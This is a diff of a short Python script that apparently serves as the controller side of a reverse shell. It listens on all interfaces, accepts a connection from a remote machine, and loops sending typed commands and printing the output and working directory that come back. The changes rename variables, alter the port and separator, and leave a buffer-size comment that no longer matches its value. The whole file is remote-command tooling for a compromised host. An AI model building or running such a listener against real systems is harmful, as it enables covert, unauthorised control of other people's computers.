@@ -1,30 +1,30 @@
 import socket
+import sys
 
-SERVER_HOST = "0.0.0.0"
-SERVER_PORT = 5003
-BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+host = "0.0.0.0"
+port = 1234  # sys.argv[1]
+buffer_size = 1024 * 256  # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
-SEPARATOR = "<sep>"
-# create a socket object
+seperator = "<br>"
+
+
+# Bind the socket to the IP address and listen
 s = socket.socket()
-
-# bind the socket to all IP addresses of this host
-s.bind((SERVER_HOST, SERVER_PORT))
-
+s.bind((host, port))
 s.listen(5)
-print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+print(f"Listening on {host}:{port} ...")
 
 # accept any connections attempted
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
 
 # receiving the current working directory of the client
-cwd = client_socket.recv(BUFFER_SIZE).decode()
-print("[+] Current working directory:", cwd)
+cwd = client_socket.recv(buffer_size).decode()
+print("Current working directory:", cwd)
 
 while True:
     # get the command from prompt
-    command = input(f"{cwd} $> ")
+    command = input(f"{cwd} > ")
     if not command.strip():
         # empty command
         continue
@@ -34,8 +34,10 @@ while True:
         # if the command is exit, just break out of the loop
         break
     # retrieve command results
-    output = client_socket.recv(BUFFER_SIZE).decode()
+    output = client_socket.recv(buffer_size).decode()
     # split command output and current directory
-    results, cwd = output.split(SEPARATOR)
+    results, cwd = output.split(seperator)
     # print output
     print(results)
+
+s.close()
